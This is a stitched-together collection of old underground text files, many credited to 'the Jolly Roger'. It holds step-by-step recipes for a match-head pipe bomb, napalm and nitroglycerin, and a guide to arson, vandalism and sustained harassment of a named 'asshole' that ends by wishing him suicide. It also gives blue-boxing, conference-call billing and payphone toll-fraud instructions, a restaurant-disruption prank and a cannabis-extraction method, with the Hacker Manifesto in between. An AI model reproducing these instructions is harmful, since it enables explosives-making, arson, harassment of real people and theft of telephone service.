fashion (such as a can with nail holes punched in its lid) and add a
bunch of dry ice, and the place the whold shebang in the freezer for a
few days. This process will add a certain amount of potency to the product,
however, this only works with dry ice, if you use normal, everyday
freezer ice, you will end up with a soggy mess...
2. Take a quantity of grass and dampen it, place in a baggie or another
socially acceptable container, and store it in a dark, dampish place
for a couple of weeks (burying it also seems to work). The grass will
develop a mold which tastes a bit harsh, a and burns a tiny bit funny,
but does increase the potency.
3. Expose the grass to the high intensity light of a sunlamp for a full
day or so. Personally, I don't feel that this is worth the effort, but
if you just spent $400 of your friend's money for this brick of
super-Colombian, right-from-the-President's-personal-stash,
and it turns out to be Missouri weed, and you're packing your bags to
leave town before the people arrive for their shares, well, you might
at least try it. Can't hurt.
4. Take the undisirable portions of our stash (stems, seeds, weak weed,
worms, etc.) and place them in a covered pot, with enough rubbing
alchol to cover everything.
Now CAREFULLY boil the mixture on an ELECTRIC stove or lab burner. DO
NOT USE GAS - the alchol is too flammable. After 45 minutes of heat,
remove the pot and strain the solids out, SAVING THE ALCOHOL.
Now, repeat the process with the same residuals, but fresh alchol.
When the second boil is over, remove the solids again, combine the two
quantities of alcohol and reboil until you have a syrupy mixture.
Now, this syrupy mixture will contain much of the THC formerly hidden
in the stems and such. One simply takes this syrup the throughly
combines it with the grass that one wishes to improve upon.
          SPECIAL SECTION ON RELATED SUBJECT MARYGIN:
Marygin is an anagram of the words marijuana and gin, as in Eli Whitney.
It is a plastic tumbler which acts much like a commercial cottin gin.
One takes about one ounce of an harb and breaks it up. This is then placed
in the Marygin and the protuding knod is roatated. This action turns
the internal wheel, which separates the grass from the debris (seeds,
stems).
It does not pulberize the grass as screens have a habit of doing and is
easily washable.
Marygin is available from:

Match Head Bomb                                 by the Jolly Roger

Simple safety match heads in a pipe, capped at both ends, make a
devestating bomb. It is set off with a regular fuse.
A plastic Baggie is put into the pipe before the heads go in to
prevent detonation by contact with the metal.
Cutting enough match heads to fill the pipe can be tedious work for
one but an evening's fun for the family if you can drag them away from
the TV.

NOW, ALTHOUGH Mc DONALDS IS FAMOUS FOR IT'S ADVERTISING AND MAKING THE
WHOLE WORLD THINK THAT THE BIG MAC IS THE BEST THING TO COME ALONG SINCE
SLICED BREAD (BUNS?), EACH LITTLE RESTAURANT IS AS AMATEUR AND SIMPLE AS
A NEW-FOUND BUSNESS. NOT ONLY ARE ALL THE EMPLOYEES RATHER INEXPERIENCED
AT WHAT THEY'RE =SUPPOSED= TO DO, BUT THEY WILL JUST LOOSE ALL CONTROL WHEN
AN EMERGENCY OCCURS....HERE WE GO!!! FIRST, GET A FEW FRIENDS (4 IS
GOOD...I'LL GET TO THIS LATER) AND ENTER THE MCDONALDS RESTAURANT, TALKING
LOUDLY AND REAKING OF SOME STRANGE SMELL THAT AUTOMATICALLY MAKES THE OLD
COUPLE SITTING BY THE DOOR LEAVE. IF ONE OF THOSE PIMPLY-FACED GOONS IS
WIPING THE FLOOR, THEN TRACK SOME CRAP ALL OVER IT (YOU COULD PRETEND TO
SLIP AND BREAK YOUR HEAD, BUT YOU MIGHT ACTUALLY DO SO).
NEXT, BEFORE YOU GET THE FOOD, FIND A TABLE. START YELLING AND RELEASING
SOME STRANGE BODY ODOR SO =ANYBODY= WOULD LEAVE THEIR TABLE AND WALK OUT
THE DOOR. SIT 2 FRIENDS THERE, AND GO UP TO THE COUNTER WITH ANOTHER.
FIND A PLACE WHERE THE LINE IS SHORT, OR IF THE LINE IS LONG SAY "I ONLY
WANNA BUY A COKE" AND YOU GET MOVED UP. NOW, YOU GET TO DO THE =ORDERING=
...HEH HEH HEH. SOMEBODY =ALWAYS= MUST WANT A PLAIN
HAMBURGER WITH ABSOLUTELY NOTHING ON IT (THIS TAKES EXTRA TIME TO MAKE, AND
DRIVES THE LITTLE HAMBURGER-MAKERS INSANE)..ORDER A 9-PACK OF CHICKEN
MCNUGGETS...NO, A 20 PACK...NO, THREE 6 PACKS...WAIT...GO BACK TO THE TABLE
AND ASK WHO WANTS WHAT. YOUR OTHER FRIEND WAITS BY THE COUNTER AND MAKES A
PASS AT THE FEMALE CLERK. GET BACK TO THE THING AND ORDER THREE 6-PACKS OF
CHICKEN ETC....NOW SHE SAYS "WHAT KIND OF SAUCE WOULD YOU LIKE?".OF COURSE,
SAY THAT YOU ALL WANT BARBECUE SAUCE ONE OF YOUR FRIENDS WANTS 2 (ONLY IF
THERE ARE ONLY 2 CONTAINERS OF BARBECUE SAUCE LEFT).THEN THEY HAFTA GO INTO
THE STOREROOM AND OPEN UP ANOTHER BOX. FINALLY, THE DRINKS...SOMEBODY WANTS
COKE, SOMEBODY ROOT BEER, AND SOMEBODY DIET COKE. AFTER THESE ARE DELIVERED,
BRING THEM BACK AND SAY "I DIDN'T ORDER A DIET COKE! I ORDERED A SPRITE!"
THIS GETS THEM MAD; BETTER YET, TURN DOWN SOMETHING TERRIBLE THAT NOBODY
WANTS TO DRINK, SO THEY HAFTA THROW THE DRINK AWAY; THEY CAN'T SELL IT.
AFTER ALL THE FOOD(?) IS HANDED TO YOU, YOU MUST =NEVER= HAVE ENOUGH MONEY
TO PAY. THE CLERK WILL BE SO ANGRY AND CONFUSED THAT SHE'LL LET YA GET
AWAY WITH IT (ANOTHER INFLUENCE ON HER IS YOUR FRIEND ASKING HER "IF YOU
LET US GO I'LL GO OUT WITH YOU" AND GIVING HER A FAKE FONE NUMBER).
NOW, BACK TO YOUR TABLE. BUT FIRST, SOMEBODY LIKES KETCHUP AND MUSTARD.
AND PLENTY (TOO MUCH) OF NAPKINS. OH, AND SOMEBODY LIKES FORKS AND KNIVES,
SO ALWAYS END UP BREAKING THE ONES YOU PICK OUTTA THE BOX. HAVE YOUR
FRIENDS YELL OUT,"YAY!!!!! WE HAVE MUNCHIES!!" AS LOUD AS THEY CAN.
THAT'LL WORRY THE ENTIRE RESTAURANT. PROCEED TO SIT DOWN. SO, YOU ARE
SITTING IN THE SMOKING SECTION (BY ACCIDENT) EH? WELL, WHILE ONE OF THE
TOBACCO-BREATHERS ISN'T LOOKING, PUT A SIGN FROM THE OTHER SIDE OF THE
ROOM SAYING "DO NOT SMOKE HERE" AND HE'LL HAFTA MOVE...THEN HE GOES INTO
THE REAL NON-SMOKING SECTION, AND GETS YELLED AT. HE THEN THINKS THAT
NO SMOKING IS ALLOWED IN THE RESTAURANT, SO HE EATS OUTSIDE (IN THE POUR-
ING RAIN) AFTER YOUR MEAL IS FINISHED (AND QUITE A FEW SPLATTERED-OPENED
KETCHUP PACKETS ARE ALL OVER YER TABLE), TRY TO LEAVE. BUT OOPS! SOMEBODY
HAS TO DO HIS DUTY IN THE MEN'S ROOM. AS HE GOES THERE, HE STICKS AN
UNEATED HAMBURGGR (WOULD YOU DARE TO EAT ONE OF THEIR HAMBURGERS?)
INSIDE THE TOILET, FLUSHES IT A WHILE,UNTIL IT RUNS ALL OVER THE BATHROOM.
OOPS! SEND A PIMPLY-FACED TEENAGER TO CLEAN IT UP. (HE WON'T KNOW THAT
BROWN THING IS A HAMBURGER, AND HE'LL GET SICK. WHEEE!)
AS YOU LEAVE THE RESTCURANT, LOOKING BACK AT YOUR UNCLEANED TABLE, SOMEBODY
MUST REMEMBER THAT THEY LEFT THEIR CHOCOLATE SHAKE THERE! THE ONE THAT'S
ALMOST FULL!!!! HE TAKES IT THEN SAYS "THIS TASTES LIKE CRAP!", THEN HE
TAKES OFF THE LID AND THROWS IT INTO THE GARBAGE CAN...OOPS! HE MISSED,
AND NOW THE SAME POOR SOUL WHO'S CLEANING UP THE BATHROOM NOW HASTA CLEAN
UP CHOCOLATE SHAKE. THEN LEAVE THE JOINT, REVERSING THE "YES, WE'RE OPEN"
SIGN (AS A REMINDER OF YER VISIT THERE YOU HAVE IT! YOU HAVE JUST PUT
ALL OF MCDONALDS INTO COMPLETE MAYHEM. AND SINCE THERE IS NO PENALTY FOR
LITTERING IN A RESTAURANT, BUGGING PEOPLE IN A PUBLIC EATERY (OR
THROW-UPERY, IN THIS CASE) YOU GET OFF SCOT-FREE. WASN'T THAT FUN?

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Another one got caught today, it's all over the papers.  "Teenager
Arrested in Computer Crime Scandal", "Hacker Arrested after Bank
Tampering"... Damn kids.  They're all alike. But did you, in your three-
piece psychology and 1950's technobrain, ever take a look behind the
eyes of the hacker?  Did you ever wonder what made him tick, what forces
shaped him, what may have molded him? I am a hacker, enter my world...
Mine is a world that begins with school... I'm smarter than most of the
other kids, this crap they teach us bores me...  Damn underachiever.
They're all alike. I'm in junior high or high school.  I've listened to
teachers explain for the fifteenth time how to reduce a fraction.
I understand it.  "No, Ms. Smith, I didn't show my work.  I did it in
my head..." Damn kid.  Probably copied it.  They're all alike.
I made a discovery today.  I found a computer.  Wait a second, this is
cool.  It does what I want it to.  If it makes a mistake, it's because I
screwed it up.  Not because it doesn't like me...  Or feels threatened by
me.. Or thinks I'm a smart ass.. Or doesn't like teaching and shouldn't be
here... Damn kid.  All he does is play games.  They're all alike. And then
it happened... a door opened to a world... rushing through the phone line
like heroin through an addict's veins, an electronic pulse is sent out,
a refuge from the day-to-day incompetencies is sought... a board is found.
"This is it... this is where I belong..." I know everyone here... even
if I've never met them, never talked to them, may never hear from them
again... I know you all... Damn kid.  Tying up the phone line again.
They're all alike... You bet your ass we're all alike... we've been
spoon-fed baby food at school when we hungered for steak... the bits of
meat that you did let slip through were pre-chewed and tasteless. 
We've been dominated by sadists, or ignored by the apathetic.  The few
that had something to teach found us willing pupils, but those few are
like drops of water in the desert.
   This is our world now... the world of the electron and the switch, the
beauty of the baud.  We make use of a service already existing without
paying for what could be dirt-cheap if it wasn't run by profiteering
gluttons, and you call us criminals.  We explore... and you call us
criminals.  We seek after knowledge... and you call us criminals.  We
exist without skin color, without nationality, without religious bias...
and you call us criminals. You build atomic bombs, you wage wars, you
murder, cheat, and lie to us and try to make us believe it's for our
own good, yet we're the criminals.
   Yes, I am a criminal.  My crime is that of curiosity.  My crime is
that of judging people by what they say and think, not what they look like.
My crime is that of outsmarting you, something that you will never
forgive me for. I am a hacker, and this is my manifesto.  You may stop
this individual,but you can't stop us all... after all, we're all alike.

    (Imported from the Apple ][ so forgive the upper case!!)

JUST ABOUT EVERYONE I TALK TO THESE DAYS ABOUT ESS SEEMS TO BE SCARED
WITLESS ABOUT THE 2600HZ DETECTOR. I DON'T KNOW WHO THOUGHT THIS ONE UP,
BUT IT SIMPLY DOES NOT EXIST. SO MANY OF YOU PEOPLE WHINE ABOUT THIS SO
-CALLED PHREAK CATCHING DEVICE FOR NO REASON. 
SOMEONE WITH AT&T SAID THEY HAD IT TO CATCH PHREAKERS.  THIS WAS JUST TO
SCARE THE BLUE-BOXERS ENOUGH TO MAKE THEM QUIT BOXING FREE CALLS.
I'M NOT SAYING ESS IS WITHOUT ITS HANG-UPS, EITHER. ONE THING THAT ESS CAN
DETECT READILY IS THE KICK-BACK THAT THE TRUNK CIRCUITRY SENDS BACK TO THE
ESS MACHINE WHEN YOUR LITTLE 2600HZ TONE RESETS THE TOLL TRUNK. AFTER AN
ESS DETECTS A KICKBACK IT TURNS AN M-F DETECTOR ON AND RECORDES ANY M-F
TONES X-MITTED.

---------------------------------------
   DEFEATING THE KICK-BACK DETECTOR
   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

AS MENTIONED IN MY PREVIOUS NOTE, KICK-BACK DETECTION CAN BE A SERIOUS
NUISANCE TO ANYONE INTERESTED IN GAINING CONTROL OF A TRUNK LINE.
THE EASIEST WAY TO BY-PASS THIS DETECTION CIRCUITRY IS NOT REALLY
BY-PASSING IT AT ALL, IT IS JUST LETTING THE KICK-BACK GET DETECTED ON
SOME OTHER LINE. THIS OTHER LINE IS YOUR LOCAL MCI, SPRINT, OR OTHER LONG
DISTANCE CARRIER (EXCEPT AT&T).  THE ONLY CATCH IS THAT THE SERVICE 
YOU USE MUST NOT DISCONNECT THE LINE WHEN YOU HIT THE 2600HZ TONE.
THIS IS HOW YOU DO IT:  CALL UP YOUR LOCAL EXTENDER, PUT IN THE CODE,
AND DIAL A NUMBER IN THE 601 AREA CODE AND THE 644 EXCHANGE. LOTS OF OTHER
EXCHANGES WORK ACROSS THE COUNTRY, I'M SURE, BUT THIS IS THE ONLY ONE
THAT I HAVE FOUND SO FAR.  ANYWAY, WHEN IT STARTS RINGING, SIMPLY HIT
2600HZ AND YOU'LL HEAR THE KICK-BACK, (KA-CHIRP, OR WHATEVER). THEN YOU ARE
READY TO DIAL WHOEVER YOU WANT (CONFERENCES, INWARD, ROUTE AND RATE,
OVERSEAS, ETC.) FROM THE TRUNK LINE IN OPERATOR TONES! SINCE BLOWING
2600HZ DOESN'T MAKE YOU YOU A PHREAKER UNTIL THE TOLL EQUIPMENT RESETS
THE LINE, KICKBACK DETECTION IS THE METHOD AT&T CHOOSES (FOR NOW)
THIS INFORMATION COMES AS A RESULT OF MY EXPERIMENTS & EXPERIENCE AND
HAS BEEN VERIFIED BY LOCAL AT&T EMPLOYEES I HAVE AS ACQUAINTANCES.
THEY COULD ONLY SAY THAT THIS IS TRUE FOR MY AREA, BUT WERE PRETTY SURE
THAT THE SAME IDEA IS IMPLEMENTED ACROSS THE COUNTRY.

THIS IS ONE THE MOST USEFUL ATTRIBUTES OF BLUE BOXING. NOW THE CONFS.
ARE UP 24 HOURS/DAY AND 7 DAYS/WEEK AND THE BILLING LINES ARE BEING
BILLED.
SINCE I BELEIVE THE ABOVE IS TRUE (ABOUT THE BILLING LINES BEING BILLED)
I WOULD RECOMMEND THAT YOU NEVER LET YOUR # SHOW UP ON THE CONF. IF YOU
STARTED IT, PUT IT ON A LOOP AND THEN CALL THE LOOP. ENOUGH
BULLSHIT!!!!! TO START THE CONF. DIAL ONE OF THESE THREE NUMBERS IN
M-F WHILE YOU ARE ON THE TRUNK.

I USE THE CONF. DIAL- UP.
A BILLING LINE EXAMPLE: KP312+001+1050ST
YOU WILL THEN HEAR TWO TUTES AND A RECORDING ASKING YOU FOR THE # OF
CONFERREES INCLUDING YOURSELF.  ENTER A # BETWEEN 20 AND 30.
IF YOU EVER GET OVER 30 PEOPLE ON A CONFERANCE ALL YOU WILL HEAR IS
JUMBLED VOICES.  AFTER THE IT SAYS
"YOUR CONFERANCE SIZE IS XX" THEN HIT # SIGN.  ADD YOUR FAVORITE LOOP
ON AND HIT 6 TO TRANSFER CONTROL TO IT. AFTER IT SAYS CONTROL WILL BE
TRANSFERED HANG UP AND CALL THE OTHER SIDE OF THE LOOP,
HIT # SIGN AND FOLLOW THE INSTRUCTIONS. A BONUS FOR CONF. IS TO ADD AN
INTERNATIONAL # DIAL 1+011+CC+NUMBER PRETTY COOL EHHH.
A FEW EXTRA NOTES.
DO NOT ADD #S THAT YOU WILL WANT TO HANG UP, ADD THESE THROUGH MCI OR
SPRINT. YOU CANNOT BLOW ANYONE OFF W/2600HZ UNLESS THEY ARE IN AN
OLD X-BAR OR OLDER SYSTEM.
MANY D.A. OPERATORS WILL STAY ON AFTER YOU ABUSE THEM; YOU MAY HAVE TO
START ANOTHER OR AT LEAST DON'T SAY ANY NUMBERS.
NEVER ADD THE TONE SIDE OF A LOOP ONTO A CONF.
NEVER ADD MORE THAN ONE MCI NODE ON YOUR CONF.

To quote Karl Marx, blue boxing has always been the most noble form of
phreaking. As opposed to such things as using an MCI code to make a free
fone call, which is merely mindless pseudo-phreaking, blue boxing
is actual interaction with the Bell System toll network.
It is likewise advisable to be more cautious when blue boxing, but the
careful phreak will not be caught, regardless of what type of switching
system he is under.
In this part, I will explain how and why blue boxing works, as well as
where. In later parts, I will give more practical information for blue
boxing and routing information. To begin with, blue boxing is simply
communicating with trunks. Trunks must not be confused with subscriber
lines (or "customer loops") which are standard telefone lines. Trunks are
those lines that connect central offices. Now, when trunks are not in
use (i.e., idle or "on-hook" state) they have 2600Hz applied to them. If
they are two-way trunks, there is 2600Hz in both directions. When a trunk
IS in use (busy or "off-hook" state), the 2600Hz is removed from the side
that is off-hook. The 2600Hz is therefore known as a supervisory
signal, because it indicates the status of a trunk; on hook (tone) or
off-hook (no tone). Note also that 2600Hz denoted SF (single frequency)
signalling and is "in-band." This is very important. "In-band" means that
is within the band of frequencies that may be transmitted over normal
telefone lines. Other SF signals, such as 3700Hz are used also. However,
they cannot be carried over the telefone network normally (they are
"out-of-band" and are therefore not able to be taken advantage of as
2600Hz is. Back to trunks. Let's take a hypothetical phone call. You pick
up your fone and dial 1+806-258-1234 (your good friend in Amarillo, Texas).
For ease, we'll assume that you are on #5 Crossbar switching and not in the
806 area. Your central office (CO) would recognize that 806 is a foreign
NPA, so it would route the call to the toll centre that serves you.
[For the sake of accuracy here, and for the more experienced readers,
note that the CO in question is a class 5 with LAMA that uses out-of-band
SF supervisory signalling]. Depending on where you are in the country,
the call would leave your toll centre (on more trunks) to another toll
centre, or office of higher "rank". Then it would be routed to central
office 806-258 eventually and the call would be completed.

            Illustration
A---CO1-------TC1------TC2----CO2----B

A.... you
CO1=your central office
TC1.. your toll office.
TC2.. toll office in Amarillo.
CO2.. 806-258 central office.
B.... your friend (806-258-1234)

In this situation it would be realistic to say that CO2 uses SF
in-band (2600Hz) signalling, while all the others use out-of-band signal-
ling (3700Hz). If you don't understand this, don't worry. I am pointing
this out merely for the sake of accuracy. The point is that while you
are connected to 806-258-1234, all those trunks from YOUR central office
(CO1) to the 806-258 central office (CO2) do *NOT* have 2600Hz on them,
indicating to the Bell equipment that a call is in progress and the trunks
are in use.
Now let's say you're tired of talking to your friend in Amarillo, so you
send a 2600Hz down the line. This tone travels down the line to your
friend's central office (CO2) where it is detected. However, that CO thinks
that the 2600Hz is originating from Bell equipment, indicating to it
that you've hung up, and thus the trunks are once again idle (with 2600Hz
present on them). But actually, you have not hung up, you have fooled the
equipment atyour friend's CO into thinking you have. Thus,it disconnects
him and resets the equipment to prepare for the next call. All this happens
very quickly (300-800ms for step-by-step equipment and 150-400ms for other
equipment). When you stop sending 2600Hz (after about a second), the
equipment thinks that another call is coming towards
--> on hook, no tone -->off hook.
Now that you've stopped sending 2600Hz, several things happen:

1) A trunk is seized.
2) A "wink" is sent to the CALLING end from the CALLED end indicating that
the CALLED end (trunk) is not ready to receive digits yet.
3) A register is found and attached to the CALLED end of the trunk within
about two seconds (max).
4) A start-dial signal is sent to the CALLING end from the CALLED end
indicating that the CALLED end is ready to receive digits.
Now, all of this is pretty much transparent to the blue boxer. All he
really hears when these four things happen is a <beep><kerchunk>. So,
seizure of a trunk would go something like this:

1> Send a 2600Hz
2> Terminate 2600Hz after 1-2 secs.
3> [beep][kerchunk]

Once this happens, you are connected to a tandem that is ready to obey your
every command. The next step is to send signalling information in order to
place your call. For this you must simulate the signalling used by
operators and automatic toll-dialing equipment for use on trunks. There are
mainly two systems, DP and MF. However, DP went out with the dinosaurs, so
I'll only discuss MF signalling. MF (multi-frequency) signalling is the
signalling used by the majority of the inter- and intra-lata network. It is
also used in international dialing known as the CCITT no.5 system.
MF signals consist of 7 frequecies, beginning with 700Hz and separated by
200Hz. A different set of two of the 7 frequencies represent the digits 0
thru 9, plus an additional 5 special keys. The frequencies and uses are as
follows:

Frequencies (Hz)  Domestic    Int'l
-------------------------------------
 700+900             1          1
 700+1100            2          2
 900+1100            3          3
 700+1300            4          4
 900+1300            5          5
1100+1300            6          6
 700+1500            7          7
 900+1500            8          8
1100+1500            9          9
1300+1500            0          0
 700+1700           ST3p       Code 1
 900+1700           STp        Code 1
1100+1700           KP         KP1
1300+1700           ST2p       KP2
1500+1700           ST         ST
 The timing of all the MF signals is a nominal 60ms, except for KP, which
should have a duration of 100ms. There should also be a 60ms silent period
between digits. This is very flexible however, and most Bell equipment will
accept outrageous timings. In addition to the standard uses
listed above, MF pulsing also has expanded usages known as "expanded
inband signalling" that include such things as coin collect, coin return,
ringback, operator attached, and operator attached, and operator
released. KP2, code 11, and code 12 and the ST_ps (STart "primes" all have
special uses which will be mentioned only briefly here.
To complete a call using a blue box once seizure of a trunk has been
accomplished by sending 2600Hz and pausing for the <beep><kerchunk>, one
must first send a KP. This readies the register for the digits that follow.
For a standard domestic call, the KP would be followed by either 7 digits
(if the call were in the same NPA as the seized trunk) or 10 digits (if the
call were not in the same NPA as the seized trunk). [Exactly like dialing
normal fone call]. Following either the KP and 7 or 10 digits, a STart is
sent to signify that no more digits follow. Example of a complete call:

1> Dial 1-806-258-1234
2> wait for a call-progress indication (such as ring,busy,recording,etc.)
3> Send 2600Hz for about 1 second.
4> Wait for about ll-progress indication (such as ring,busy,recording,etc.)
5> Send KP+305+994+9966+ST
The call will then connect if everything was done properly. Note that if a
call to an 806 number were being placed in the same situation, the are code
would be omitted and only KP + seven digits + ST would be sent.
Code 11 and code 12 are used in international calling to request
certain types of operators. KP2 is used in international calling to route a
call other than by way of the normal route, whether for economic or
equipment reasons. STp, ST2p, and ST3p (prime, two prime, and three prime)
are used in TSPS signalling to indicate calling type of call (such as
coin-direct dialing.

Napalm (Another way to make it...)              by the Jolly Roger

   (See file #021 of Cookbook IV for an easy way to make it!!)

About the best fire bomb is napalm. It has a thick consistancy,
like jam and is best for use on vehilces or buildings.
Napalms is simply one part gasoline and one part soap. The soap is
either soap flakes or shredded bar soap. Detergents won't do.
The gasoline must be heated in order for the soap to melt. The
usual way is with a double boiler where the top part has at least a
two-quart capicity. The water in the bottom part is brought to a boil
and the double boiler is taken from the stove and carried to where
there is no flame.
Then one part, by volume, of gasoline is put in the top part and
allowed to heat as much as it will and the soap is added and the mess
is stirred until it thickens. A better way to heat gasoline is to fill
a bathtub with water as hot as you can get it. It will hold its heat
longer and permit a much larger container than will the double boiler.

Nitroglycerin Recipe                            by the Jolly Roger

Like all chemists I must advise you all to take the greatest care
and caution when you are doing this.  Even if you have made this stuff
before.
This first article will give you information on making
nitroglyerin, the basic ingredient in a lot of explosives such as
straight dynamites, and geletin dynamites.
Making nitroglycerin
1. Fill a 75-milliliter beaker to the 13 ml. Level with fuming
   red nitric acid, of 98% pure concentration.
2. Place the beaker in an ice bath and allow to cool below room
   temp.
3. After it has cooled, add to it three times the amount of
   fuming sulferic acid (99% h2so4).  In other words, add to the
   now-cool fuming nitric acid 39 ml. Of fuming sulferic acid.
   When mixing any acids, always do it slowly and carefully to
   avoid splattering.
4. When the two are mixed, lower thier temp. By adding more ice
   to the bath, about 10-15 degrees centigrade. (Use a
   mercury-operated thermometer)
5. When the acid solution has cooled to the desired temperature,
   it is ready for the glycerin. The glycerin must be added in
   small amounts using a medicine dropper.  (Read this step about
   10 times!)  Glycerin is added slowly and carefully (i mean
   careful!) Until the entire surface of the acid it covered with
   it.
6. This is a dangerous point since the nitration will take place
   as soon as the glycerin is added. The nitration will produce
   heat, so the solution must be kept below 30 degrees
   centigrade! If the solution should go above 30 degrees,
   immediately dump the solution into the ice bath!  This will
   insure that it does not go off in your face!
7. For the first ten minutes of nitration, the mixture should be
   gently stirred.  In a normal reaction the nitroglycerin will
   form as a layer on top of the acid solution, while the sulferic
   acid will absorb the excess water.
8. After the nitration has taken place, and the nitroglycerin has
   formed on the top of the solution, the entire beaker should be 
   transferred slowly and carefully to another beaker of water. 
   When this is done the nitroglycerin will settle at the bottem
   so the other acids can be drained away.
9. After removing as much acid as posible without disturbing the
   nitroglycerin, remove the nitroglycerin with an eyedropper and
   place it in a bicarbonate of soda (sodium bicarbonate in case
   you didn't know) solution.  The sodium is an alkalai and will
   nuetralize much of the acid remaining. This process should be
   repeated as much as necesarry using blue litmus paper to check
   for the presence of acid.  The remaining acid only makes the
   nitroglycerin more unstable than it already is.
10. Finally! The final step is to remove the nitroglycerin from
    the bicarbonate.  His is done with and eye- dropper, slowly
    and carefully.  The usual test to see if nitration has been
    successful is to place one drop of the nitroglycerin on metal
    and ignite it.  If it is true nitroglycerin it will burn with
    a clear blue flame.
** Caution **
Nitro is very sensative to decomposition, heating dropping, or
jarring, and may explode if left undisturbed and cool.

Operation: Fuckup                                 by the Jolly Roger

This is a guide for Anarchists and can be funny for non-believers and 12
and 13 year old runts, and can be a lexicon of deadly knowledge for True
Anarchists... Serious damage is intended to be dealt here. Do not try
this stuff unless you want to do a lot of serious Anarchy. 
[Simulation]
Asshole - 'Listen, you little teenager punk shit, shut the fuck up, or I'll
knock you down!'
Anarchist - 'O.K.....You can't say I didn't warn you. You don't know my 
rue power...' (soooo casually)
Asshole - 'Well, er, what do you mean? Anarchist - '<demoniac grin>'
As you can see, the Anarchist knows something that this asshole doesn't...

[Operation Fuckup]
Geta wheel barrel or two. Fill with gasoline. Get 16 rolls of toilet
paper, unroll & drench in the gasoline. Rip to shreds in gasoline. Get
asbestos gloves. Light a flare (to be punk), grab glob of
saturated toilet paper (you can ignite the glob or not). Throw either
flaming or dripping glob into:
any window (picture is the best)
front doors
rough grain siding
and best of all, brick walls.
First of all, this bitch is near impossible to get off once dried, and
is a terror to people inside when lit! After this... during the
night, get a pickup truck, a few wheel-barrels, and a dozen friends with 
shovels. The pickup can be used only for transporting people
and equipment, or doing that, and carting all the dirt. When it gets
around 12:00 (after the loser goes beddie - bye), dig a gargantuan hole
in his front yard until about 3:00. You can either assign three or four
of your friends to cart the dirt ten miles away in the pickup-bed, or
bury his front door in 15' of dirt! After that is done, get
three or four buckets of tar, and coat his windows. You can make an
added twist by igniting the tar when you are all done and ready to
run! That is if the loser has a house. If he lives inside an apartment
building, you must direct the attack more toward his car, and front door.
I usually start out when he goes to work...I find out what his cheap car
looks like, and memorize it for future abuse...It is always fun to paint
his front door (apt.) hot pink with purple polka-dots, and off-neon
colors in diagonal stripes. You can also pound a few hundred or so four
inch nails into his front door (this looks like somebody really
doesn't like you from the inside). Another great is to fill his keyhole
with liquid steel so that after the bastard closes his door - the
only way to get back in is to break it down. If you can spare it, leave
him an axe - that is, implanted three inches into, and through the door!
Now, this next one is difficult, but one of the best! Get a piece of wood
siding that will more than cover his front door completely. Nail two by
fours on the edges of the siding (all except the bottom) so you have
a barge - like contraption. Make a hole at the top that will be large
enough for a cement slide. Mix about six or seven LARGE bags of QUICK
drying cement. Use the cement slide to fill the antichamber created by
the 'barge' that is around his door. Use more two by fours to brace
your little cement-filled barge, and let the little gem dry. When it is,
remove the 'barge' so only a stone monolith remains that covers his door.
Use any remaining cement to make a base around this so he can't just push
it over. When I did this, he called the fire department, and they thought
he meant wood, so they brought axes. I watched with a few dozen or so
other tenants, and laughed my damn ass off! This is only his door! After
he parks his car for the night, the fun really begins...I start out
by opening up the car by jamming a very thin, but loack - inside and out!
Then proceed to put orange-juice syrup all over the seats, so after he
gets through all the other shit that you do, he will have the stickiest
seats in the world. You can then get a few Sunday papers, and crack one of
the windows about four inches. Lightly crumple the papers, and continue to
completely fill the inside of his car with the newspapers. A copy of the
Sunday New York Times will nicely fill a Volkeswagon! What is also quite
amusing is to put his car on cinder blocks, slash his tires at the top, and
fill them with cement! Leave the cinder blocks there so that, after he
knocks the car off of them, he will get about 3 miles to the gallon with
those tires, and do 0 to 60 in about two minutes! It is even more
hilarious when he doesn't know why the hell why! Another is to open his
hood, and then run a few wires from the sparkplugs to the METAL body.
The sure is one HOT car when it is running! Now, I like to pour two pounds
of sugar down his gas tank. If this doesn't blow every gasket in his
engine it will do something called 'carmelizing his engine'. This is when
the extreme heat turns the sugar to carmel, and you literally must
completely take the engine out and apart, and clean each and every
individual part!
Well, if this asshole does not get the message, you had better start to
get serious. If this guide was used properly & as it was intended (no,
not as kindling for the fire), this asshole will either move far away,
seek professional psychological help, commit suicide,
or all of the above!

*            How to "steal" local calls from most Payphones         *
*-+-*-+-*-+-*-+-*-+-*-+-*-+-*-+-*-+-*-+-*-+-*-+-*-+-*-+-*-+-*-+-*-+-*
                           by the Jolly Roger

Now to make free local calls, you need a finishing nail.  I highly
recommend "6D E.G. FINISH C/H, 2 INCH" nails.  These are about 3/32 of
an inch in diameter and 2 inches long (of course).  You also need a large
size paper clip. By large  I  mean they  are  about  2  inches  long
(FOLDED). Then  you  unfold the paper clip.  Unfold it by taking each piece
and moving it out 90 degrees.  When it is done it should look somewhat
like this: 

                               /----------\
                               :          :
                               :          :
                               :          :
                               :          :
                                          \-----     

Now,  on to the neat stuff.  What you do,  instead of unscrewing the 
glued-on  mouthpiece,  is  insert the nail into the center  hole  of
the mouthpiece  (where you talk) and push it in with
pressure or just hammer it in by hitting the nail on something. 
Just DON'T KILL THE  MOUTHPIECE! You  could  damage  it
if you insert the nail too far or  at  some  weird angle.  If  this
happens then the other party won't be able to hear  what you say.
You now have a hole in the mouthpiece in which you can easily insert the 
paper clip. So, take out the nail and put in the paper  clip.
Then take the other end of the paper clip and shove it under the rubber
cord protector at the bottom of the handset (you know, the blue guy...).
This should end up looking remotely like...like this:
                            /----------\      Mouthpiece
                            :          :   
            Paper clip -->  :          :     /
                            :      /---:---\
                            :      :   : 
                            :------------>
        ====================\---))):
                                   :  To earpiece ->
                                   ^              ^
                                   \-------------------->
                                   :              :
                                   :              :         
                                 Cord          Blue guy
(The  paper clip is shoved under the blue guy to make a  good  connection
between the inside of the mouthpiece and the metal cord.)
Now,  dial  the number of a local number you wish to  call,  sayyyy, 
MCI.  If  everything  goes okay, it should ring and not answer with the 
"The Call You Have Made Requires a 20 Cent Deposit" recording.  After the 
other  end  answers  the phone, remove the  paper  clip.  It's  all  that 
simple, see?
There  are  a couple problems,  however.  One  is,  as  I mentioned 
earlier, the mouthpiece not working after you punch it.  If this  
happens to you,  simply move on to the next payphone.  The one you are
now on  is lost.  Another problem is that the touch tones won't work
when the paper clip is in the mouthpiece. There are two ways around this..
A> Dial the first 6 numbers.  This should be done without the  paper 
clip making the connection, i.e., one side should not be connected.
Then connect  the paper clip,  hold down the last digit,  and slowly
